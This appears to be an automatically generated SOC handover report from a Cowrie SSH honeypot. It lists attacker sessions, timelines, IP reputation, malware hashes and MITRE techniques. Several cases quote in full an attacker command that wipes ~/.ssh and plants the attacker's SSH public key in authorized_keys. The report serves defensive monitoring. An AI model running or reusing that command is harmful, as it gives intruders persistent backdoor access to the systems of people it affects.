| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:44 |
| **Last Seen** | 2026-04-06 10:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:44:28` | `cowrie.session.connect` |
| `2026-04-06 10:44:28` | `cowrie.client.version` |
| `2026-04-06 10:44:28` | `cowrie.client.kex` |
| `2026-04-06 10:44:28` | `cowrie.login.success` |
| `2026-04-06 10:44:28` | `cowrie.session.params` |
| `2026-04-06 10:44:28` | `cowrie.command.input` |
| `2026-04-06 10:44:28` | `cowrie.command.failed` |
| `2026-04-06 10:44:29` | `cowrie.log.closed` |
| `2026-04-06 10:44:29` | `cowrie.session.params` |
| `2026-04-06 10:44:29` | `cowrie.command.input` |
| `2026-04-06 10:44:29` | `cowrie.session.file_download` |
| `2026-04-06 10:44:29` | `cowrie.log.closed` |
| `2026-04-06 10:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19cc58442b52

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:44 |
| **Last Seen** | 2026-04-06 10:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:44:31` | `cowrie.session.connect` |
| `2026-04-06 10:44:31` | `cowrie.client.version` |
| `2026-04-06 10:44:31` | `cowrie.client.kex` |
| `2026-04-06 10:44:32` | `cowrie.login.success` |
| `2026-04-06 10:44:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2d66ecf47e

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:45 |
| **Last Seen** | 2026-04-06 10:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:45:42` | `cowrie.session.connect` |
| `2026-04-06 10:45:42` | `cowrie.client.version` |
| `2026-04-06 10:45:42` | `cowrie.client.kex` |
| `2026-04-06 10:45:43` | `cowrie.login.success` |
| `2026-04-06 10:45:43` | `cowrie.session.params` |
| `2026-04-06 10:45:43` | `cowrie.command.input` |
| `2026-04-06 10:45:43` | `cowrie.command.failed` |
| `2026-04-06 10:45:43` | `cowrie.log.closed` |
| `2026-04-06 10:45:44` | `cowrie.session.params` |
| `2026-04-06 10:45:44` | `cowrie.command.input` |
| `2026-04-06 10:45:44` | `cowrie.session.file_download` |
| `2026-04-06 10:45:44` | `cowrie.log.closed` |
| `2026-04-06 10:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30bf0487d9ca

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:45 |
| **Last Seen** | 2026-04-06 10:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:45:46` | `cowrie.session.connect` |
| `2026-04-06 10:45:46` | `cowrie.client.version` |
| `2026-04-06 10:45:46` | `cowrie.client.kex` |
| `2026-04-06 10:45:47` | `cowrie.login.success` |
| `2026-04-06 10:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-456d610734ea

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:51 |
| **Last Seen** | 2026-04-06 10:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:51:26` | `cowrie.session.connect` |
| `2026-04-06 10:51:26` | `cowrie.client.version` |
| `2026-04-06 10:51:26` | `cowrie.client.kex` |
| `2026-04-06 10:51:26` | `cowrie.login.success` |
| `2026-04-06 10:51:27` | `cowrie.session.params` |
| `2026-04-06 10:51:27` | `cowrie.command.input` |
| `2026-04-06 10:51:27` | `cowrie.command.failed` |
| `2026-04-06 10:51:27` | `cowrie.log.closed` |
| `2026-04-06 10:51:27` | `cowrie.session.params` |
| `2026-04-06 10:51:27` | `cowrie.command.input` |
| `2026-04-06 10:51:27` | `cowrie.session.file_download` |
| `2026-04-06 10:51:27` | `cowrie.log.closed` |
| `2026-04-06 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcfa97cfc275

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:51 |
| **Last Seen** | 2026-04-06 10:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:51:29` | `cowrie.session.connect` |
| `2026-04-06 10:51:29` | `cowrie.client.version` |
| `2026-04-06 10:51:30` | `cowrie.client.kex` |
| `2026-04-06 10:51:30` | `cowrie.login.success` |
| `2026-04-06 10:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76db9d6cf04b

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:52 |
| **Last Seen** | 2026-04-06 10:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:52:49` | `cowrie.session.connect` |
| `2026-04-06 10:52:49` | `cowrie.client.version` |
| `2026-04-06 10:52:50` | `cowrie.client.kex` |
| `2026-04-06 10:52:50` | `cowrie.login.success` |
| `2026-04-06 10:52:50` | `cowrie.session.params` |
| `2026-04-06 10:52:50` | `cowrie.command.input` |
| `2026-04-06 10:52:50` | `cowrie.command.failed` |
| `2026-04-06 10:52:51` | `cowrie.log.closed` |
| `2026-04-06 10:52:51` | `cowrie.session.params` |
| `2026-04-06 10:52:51` | `cowrie.command.input` |
| `2026-04-06 10:52:51` | `cowrie.session.file_download` |
| `2026-04-06 10:52:51` | `cowrie.log.closed` |
| `2026-04-06 10:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1ebfd30cdc7

| Field | Detail |
|---|---|
| **Source IP** | `35.210.61[.]208` |
| **First Seen** | 2026-04-06 10:52 |
| **Last Seen** | 2026-04-06 10:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:52:53` | `cowrie.session.connect` |
| `2026-04-06 10:52:53` | `cowrie.client.version` |
| `2026-04-06 10:52:53` | `cowrie.client.kex` |
| `2026-04-06 10:52:54` | `cowrie.login.success` |
| `2026-04-06 10:52:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.61[.]208` to AbuseIPDB if not already reported
- [ ] Block `35.210.61[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d2e5713a5b2

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:53 |
| **Last Seen** | 2026-04-06 10:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:53:15` | `cowrie.session.connect` |
| `2026-04-06 10:53:15` | `cowrie.client.version` |
| `2026-04-06 10:53:15` | `cowrie.client.kex` |
| `2026-04-06 10:53:15` | `cowrie.login.success` |
| `2026-04-06 10:53:16` | `cowrie.session.params` |
| `2026-04-06 10:53:16` | `cowrie.command.input` |
| `2026-04-06 10:53:16` | `cowrie.command.failed` |
| `2026-04-06 10:53:16` | `cowrie.log.closed` |
| `2026-04-06 10:53:16` | `cowrie.session.params` |
| `2026-04-06 10:53:16` | `cowrie.command.input` |
| `2026-04-06 10:53:16` | `cowrie.session.file_download` |
| `2026-04-06 10:53:16` | `cowrie.log.closed` |
| `2026-04-06 10:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-953d8aa6e0b4

| Field | Detail |
|---|---|
| **Source IP** | `14.248.82[.]58` |
| **First Seen** | 2026-04-06 10:53 |
| **Last Seen** | 2026-04-06 10:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-06 10:53:18` | `cowrie.session.connect` |
| `2026-04-06 10:53:18` | `cowrie.client.version` |
| `2026-04-06 10:53:18` | `cowrie.client.kex` |
| `2026-04-06 10:53:19` | `cowrie.login.success` |
| `2026-04-06 10:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.248.82[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.248.82[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `35.210.61[.]208` | **21** | 2026-04-06 10:21 | 2026-04-06 10:52 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.82[.]58` | **16** | 2026-04-06 10:25 | 2026-04-06 10:53 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `112.26.99[.]93` | 1 | 2026-04-06 09:43 | 2026-04-06 09:43 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.6.250[.]42` | 1 | 2026-04-06 10:18 | 2026-04-06 10:19 | 12s | 0 | `T1592` | 🟢 LOW |
| `218.248.19[.]102` | 1 | 2026-04-06 09:25 | 2026-04-06 09:25 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `5.187.35[.]142` | 1 | 2026-04-06 10:24 | 2026-04-06 10:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `60.246.136[.]161` | 1 | 2026-04-06 09:56 | 2026-04-06 09:56 | 30s | 0 | `T1592` | 🟢 LOW |
| `82.129.230[.]191` | 1 | 2026-04-06 10:23 | 2026-04-06 10:23 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `60.246.136[.]161` | MO | CTM | **100** ⚠️ | 7 |
| `218.248.19[.]102` | IN | The Principal | **100** ⚠️ | 43 |
| `112.26.99[.]93` | CN | China Mobile Communications Corporation | **100** ⚠️ | 24 |
| `14.248.82[.]58` | VN | Vietnam Posts and Telecommunications Group | **100** ⚠️ | 12 |
| `5.187.35[.]142` | NL | Amarutu Technology Ltd | **100** ⚠️ | 50 |
| `35.210.61[.]208` | BE | Google LLC | **100** ⚠️ | 50 |
| `82.129.230[.]191` | EG | EG-Hinet-Belbeis | **100** ⚠️ | 8 |
| `121.6.250[.]42` | SG | SingNet Pte Ltd | **97** ⚠️ | 0 |
| `103.206.103[.]164` | IN | Nas Internet Services Private Limited | 19 | 0 |
| `52.176.138[.]198` | US | Microsoft Corporation | 9 | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 80 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 40 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 39 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 19 below threshold 25 | 19 |
| AbuseIPDB score 9 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 103 cases |
| Tool 34  | Credential Extractor        | ✅ 79 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 10 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (19.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 10 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 40 priority case(s) shown individually · 8 recon entry/entries in table (2 group(s) consolidating 37 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-06T10:55:04Z_
